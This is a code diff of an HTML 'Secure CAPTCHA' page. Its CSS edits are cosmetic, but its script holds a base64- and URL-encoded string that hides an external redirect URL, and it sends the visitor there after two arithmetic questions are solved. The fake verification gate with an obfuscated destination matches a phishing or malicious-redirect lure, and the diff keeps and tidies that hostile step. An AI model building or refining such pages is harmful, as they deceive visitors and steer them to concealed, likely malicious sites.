@@ -5,14 +5,23 @@
   <title>Secure Access</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
+    :root {
+      --bg: #ffffff;
+      --text: #333;
+      --box-bg: linear-gradient(145deg, #f0f0f0, #ffffff);
+      --primary: #007bff;
+      --success: #28a745;
+    }
+
     * {
       box-sizing: border-box;
     }
 
     body {
       margin: 0;
+      background: var(--bg);
+      color: var(--text);
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f0f2f5;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -21,50 +30,60 @@
       position: relative;
     }
 
-    /* Logo section */
     .logo {
       position: absolute;
-      top: 20px;
-      left: 20px;
+      top: 25px;
+      left: 25px;
       display: flex;
       align-items: center;
-      z-index: 100;
+      background: #ffffff;
+      padding: 10px 16px;
+      border-radius: 14px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
     }
 
     .logo img {
       width: 60px;
       height: 60px;
       margin-right: 12px;
+      object-fit: contain;
+      transition: transform 0.3s ease;
+    }
+
+    .logo img:hover {
+      transform: scale(1.1);
     }
 
     .logo span {
-      font-size: 1.5rem;
+      font-size: 1.4rem;
       font-weight: 600;
-      color: #007bff;
-      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+      color: var(--primary);
     }
 
     #captcha-box {
-      background: #fff;
-      padding: 40px 30px;
+      background: var(--box-bg);
+      padding: 35px 30px 30px;
       border-radius: 16px;
-      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.12);
+      border: 2px solid #e0e0e0;
       text-align: center;
       width: 100%;
       max-width: 400px;
-      border-top: 5px solid #007bff;
+      transition: box-shadow 0.3s ease;
+    }
+
+    #captcha-box:hover {
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
     }
 
     h2 {
-      margin-bottom: 25px;
-      font-size: 1.6rem;
-      color: #007bff;
+      font-size: 1.5rem;
+      margin-bottom: 22px;
     }
 
     #captcha-question {
       font-size: 1.2rem;
-      margin-bottom: 15px;
-      color: #333;
+      margin-bottom: 14px;
     }
 
     input[type="number"] {
@@ -72,21 +91,27 @@
       padding: 10px;
       width: 60%;
       max-width: 200px;
-      margin-bottom: 20px;
+      margin-bottom: 15px;
       border: 1px solid #ccc;
       border-radius: 6px;
       text-align: center;
+      transition: border 0.3s ease;
+    }
+
+    input[type="number"]:focus {
+      border-color: var(--primary);
+      outline: none;
     }
 
     button {
       padding: 12px 24px;
       font-size: 1rem;
-      background-color: #007bff;
+      background-color: var(--primary);
       color: white;
       border: none;
       border-radius: 8px;
       cursor: pointer;
-      transition: background 0.2s ease;
+      transition: background 0.3s ease;
     }
 
     button:hover {
@@ -94,22 +119,24 @@
     }
 
     #message {
-      margin-top: 15px;
-      font-size: 1rem;
-      color: #333;
+      margin-top: 18px;
+      font-size: 1.1rem;
       min-height: 24px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
     }
 
-    #success-icon {
-      font-size: 2rem;
-      color: green;
-      display: none;
-      margin-top: 10px;
+    .icon-success {
+      width: 26px;
+      height: 26px;
+      filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.1));
     }
 
     @media (max-width: 480px) {
       #captcha-box {
-        padding: 25px 20px;
+        padding: 24px;
       }
 
       input[type="number"] {
@@ -118,12 +145,11 @@
 
       button {
         width: 100%;
-        margin-top: 10px;
       }
 
-      .logo img {
-        width: 50px;
-        height: 50px;
+      .logo {
+        flex-direction: column;
+        align-items: flex-start;
       }
 
       .logo span {
@@ -134,13 +160,13 @@
 </head>
 <body>
 
-  <!-- Stylish Logo -->
+  <!-- Top-left Logo (Padlock) -->
   <div class="logo">
-    <img src="data:image/svg+xml;base64,PHN2ZyBmaWxsPSIjMDA3QkZGIiB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCA1MTIgNTEyIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0zNzYuNiAyMTguOEwzNjkgMjI2LjhjLTEwLjMgMTAuMi0yMi44IDE3LjktMzYuOCAyMi43IDE1LjYtMy41IDI5LjctMTEuMiA0MS41LTIzLjMgMTIuMS0xMi4xIDIwLjgtMjYuOSAyNC45LTQzLjcuNS0xLjggMS0zLjcgMS4yLTUuNiAyLjItMTQuNSAzLjQtMjkuNSAzLjQtNDUgMC01LjEtLjItMTAuMi0uNi0xNS4zLTEtMTMuNS0yLjgtMjYuNS01LjQtMzkuMS0xLjctOC43LTQuMS0xNy4xLTYuOS0yNS4zLjktMi44IDIuNS01LjUgMy43LTguMi0uMy4xLS42LjItMSAuMi0xNC4zIDAtMjguMS0zLjUtNDEuMS05LjctMTIuNi02LjItMjMuOS0xNC43LTMyLjktMjUuMy0xMS43LTE0LjEtMjAuMy0zMC42LTI0LjktNDguNS0yLjQtOC44LTMuNS0xOC0zLjUtMjcuMSAwLTE0LjggMy4xLTI4LjggOC41LTQxLjggNS41LTEzLjYgMTMuNi0yNi4zIDIzLjYtMzYuOCAxMC4xLTEwLjQgMjIuOC0xOC4xIDM2LjgtMjIuNy0xNS42IDMuNS0yOS43IDExLjItNDEuNSAyMy4zLTEyLjEgMTIuMS0yMC44IDI2LjktMjQuOSA0My43LS41IDEuOC0xIDMuNy0xLjIgNS42LTIuMiAxNC41LTMuNCAyOS41LTMuNCA0NSAwIDUuMS4yIDEwLjIuNiAxNS4zIDEgMTMuNSAyLjggMjYuNSA1LjQgMzkuMSAxLjcgOC43IDQuMSAxNy4xIDYuOSAyNS4zLS45IDIuOC0yLjUgNS41LTMuNyA4LjIgLjMtLjEgLjYtLjIgMS0uMiAxNC4zIDAgMjguMSAzLjUgNDEuMSA5LjcgMTIuNiA2LjIgMjMuOSAxNC43IDMyLjkgMjUuMyAxMS43IDE0LjEgMjAuMyAzMC42IDI0LjkgNDguNSAyLjQgOC44IDMuNSAxOCAzLjUgMjcuMSAwIDE0LjgtMy4xIDI4LjgtOC41IDQxLjgtNS41IDEzLjYtMTMuNiAyNi4zLTIzLjYgMzYuOC0xMC4xIDEwLjQtMjIuOCAxOC4xLTM2LjggMjIuNyAxNS42LTMuNSAyOS43LTExLjIgNDEuNS0yMy4zIDEyLjEtMTIuMSAyMC44LTI2LjkgMjQuOS00My43LjUtMS44IDEuLTMuNyAxLjItNS42IDIuMi0xNC41IDMuNC0yOS41IDMuNC00NSAwLTUuMS0uMi0xMC4yLS42LTE1LjMtMS0xMy41LTIuOC0yNi41LTUuNC0zOS4xLTEuNy04LjctNC4xLTE3LjEtNi45LTI1LjMuOS0yLjggMi41LTUuNSAzLjctOC4yeiIvPjwvc3ZnPg==" alt="CAPTCHA Logo" />
+    <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Captcha Padlock Logo">
     <span>Secure CAPTCHA</span>
   </div>
 
-  <!-- CAPTCHA Box -->
+  <!-- CAPTCHA Challenge Box -->
   <div id="captcha-box">
     <h2>Solve this to continue</h2>
     <div id="captcha-question">Loading...</div>
@@ -148,21 +174,21 @@
     <br />
     <button onclick="validateCaptcha()">Submit</button>
     <div id="message"></div>
-    <div id="success-icon">✅</div>
   </div>
 
   <script>
     let answer = 0;
     let firstSolved = false;
-    const base64Meta = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZWhhdG92ZXIuZmVubWVub3MuZGUvZnFnZ1QlMjIlMjAvJTNF";
+
+    const base64Ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZWhhdG92ZXIuZmVubWVub3MuZGUvZnFnZ1QlMjIlMjAvJTNF";
 
     function generateCaptcha() {
       const num1 = Math.floor(Math.random() * 20) + 1;
       const num2 = Math.floor(Math.random() * 10) + 1;
       const operations = ['+', '-', '*'];
       const operation = operations[Math.floor(Math.random() * operations.length)];
-      let question = '';
 
+      let question = '';
       switch (operation) {
         case '+':
           answer = num1 + num2;
@@ -181,41 +207,39 @@
       document.getElementById("captcha-question").innerText = `What is ${question}?`;
       document.getElementById("user-answer").value = '';
       document.getElementById("message").innerText = '';
-      document.getElementById("success-icon").style.display = "none";
     }
 
     function validateCaptcha() {
       const userAnswer = parseInt(document.getElementById("user-answer").value);
       const msg = document.getElementById("message");
-      const successIcon = document.getElementById("success-icon");
 
       if (userAnswer === answer) {
         if (!firstSolved) {
           firstSolved = true;
-          msg.innerText = "✅ Correct! One more to go...";
+          msg.innerText = "Correct! One more to go...";
           generateCaptcha();
         } else {
-          msg.innerText = "✅ Access granted!";
-          successIcon.style.display = "block";
-          setTimeout(() => redirectUser(), 1500);
+          msg.innerHTML = `Access granted <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Green Check" class="icon-success">`;
+          setTimeout(() => {
+            redirectUser();
+          }, 1500);
         }
       } else {
-        msg.innerText = "❌ Incorrect. Try again.";
-        successIcon.style.display = "none";
+        msg.innerText = "Incorrect. Please try again.";
       }
     }
 
     function redirectUser() {
       try {
-        const decoded = decodeURIComponent(atob(base64Meta));
-        const urlMatch = decoded.match(/url=([^"]+)/);
-        if (urlMatch && urlMatch[1]) {
-          window.location.href = urlMatch[1];
+        const decoded = decodeURIComponent(atob(base64Ref));
+        const match = decoded.match(/url=([^"]+)/);
+        if (match && match[1]) {
+          window.location.href = match[1];
         } else {
-          document.getElementById("message").innerText = "⚠️ Invalid redirect link.";
+          alert("Redirect URL invalid.");
         }
-      } catch {
-        document.getElementById("message").innerText = "⚠️ Redirect error.";
+      } catch (e) {
+        alert("Redirect failed. Invalid base64.");
       }
     }
 
